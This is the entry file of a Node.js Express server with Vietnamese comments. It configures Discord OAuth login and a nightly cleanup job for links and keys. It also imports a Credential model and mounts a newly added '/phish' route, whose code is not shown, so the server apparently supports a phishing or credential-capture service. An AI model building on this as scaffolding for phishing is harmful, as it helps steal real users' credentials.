const express = require('express');
const session = require('express-session');
const passport = require('passport');
const DiscordStrategy = require('passport-discord').Strategy;
const bodyParser = require('body-parser');
const cron = require('node-cron');
const { Op } = require('sequelize');

const { sequelize, User, Link, Key, Credential } = require('./models');

const authRoutes = require('./routes/auth');
const appRoutes = require('./routes/app');
const keyRoutes = require('./routes/key');
const phishRoutes = require('./routes/phish'); // THÊM ROUTE MỚI

const PORT = process.env.PORT || 3000;
const DISCORD_CLIENT_ID = process.env.DISCORD_CLIENT_ID;
const DISCORD_CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET;
const SESSION_SECRET = process.env.SESSION_SECRET;
const BASE_URL = process.env.RENDER_EXTERNAL_URL;
const HCAPTCHA_SITE_KEY = process.env.HCAPTCHA_SITE_KEY;

if (!DISCORD_CLIENT_ID || !DISCORD_CLIENT_SECRET || !SESSION_SECRET || !BASE_URL || !HCAPTCHA_SITE_KEY) {
    console.error("LỖI: Thiếu các biến môi trường cần thiết!");
    process.exit(1);
}

const app = express();

app.set('view engine', 'ejs');
app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(session({
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: { secure: 'auto', httpOnly: true }
}));

app.use(passport.initialize());
app.use(passport.session());

passport.serializeUser((user, done) => {
    done(null, user.discordId);
});

passport.deserializeUser(async (id, done) => {
    try {
        const user = await User.findByPk(id);
        done(null, user);
    } catch (err) {
        done(err, null);
    }
});

passport.use(new DiscordStrategy({
    clientID: DISCORD_CLIENT_ID,
    clientSecret: DISCORD_CLIENT_SECRET,
    callbackURL: `${BASE_URL}/auth/discord/callback`,
    scope: ['identify', 'email']
}, async (accessToken, refreshToken, profile, done) => {
    try {
        const { id, username, avatar } = profile;
        const avatarUrl = avatar ? `https://cdn.discordapp.com/avatars/${id}/${avatar}.png` : 'https://cdn.discordapp.com/embed/avatars/0.png';
        const [user, created] = await User.findOrCreate({
            where: { discordId: id },
            defaults: { username: username, avatar: avatarUrl }
        });
        if (!created && (user.username !== username || user.avatar !== avatarUrl)) {
          user.username = username;
          user.avatar = avatarUrl;
          await user.save();
        }
        return done(null, user);
    } catch (err) {
        console.error("Lỗi trong Discord strategy:", err);
        return done(err, null);
    }
}));

app.use('/auth', authRoutes);
app.use('/key', keyRoutes);
app.use('/phish', phishRoutes); // SỬ DỤNG ROUTE MỚI
app.use('/', appRoutes);

cron.schedule('0 2 * * *', async () => {
    const now = new Date();
    console.log(`[CRON] Bắt đầu tác vụ dọn dẹp lúc ${now.toLocaleString('vi-VN')}...`);
    try {
        const twoDaysAgo = new Date(Date.now() - 2 * 24 * 60 * 60 * 1000);
        const deletedLinksCount = await Link.destroy({ where: { lastVisitedAt: { [Op.lt]: twoDaysAgo } } });
        if(deletedLinksCount > 0) console.log(`[CRON] Đã xóa ${deletedLinksCount} liên kết cũ.`);
        
        const deletedKeysCount = await Key.destroy({ where: { expiresAt: { [Op.lt]: now } } });
        if(deletedKeysCount > 0) console.log(`[CRON] Đã xóa ${deletedKeysCount} key đã hết hạn.`);
        
        console.log('[CRON] Tác vụ dọn dẹp hoàn tất.');
    } catch (error) {
        console.error('[CRON] Lỗi trong quá trình dọn dẹp:', error);
    }
}, {
    scheduled: true,
    timezone: "Asia/Ho_Chi_Minh"
});

async function startServer() {
    try {
        await sequelize.authenticate();
        console.log('✅ Kết nối CSDL thành công.');
        await sequelize.sync({ alter: true });
        console.log('✅ Đồng bộ hóa Models thành công.');
        app.listen(PORT, () => {
            console.log(`🚀 Máy chủ đang chạy tại cổng ${PORT}`);
            console.log(`🌐 URL công khai: ${BASE_URL}`);
        });
    } catch (error) {
        console.error('❌ Lỗi không thể kết nối CSDL hoặc khởi động máy chủ:', error);
        process.exit(1);
    }
}
startServer();
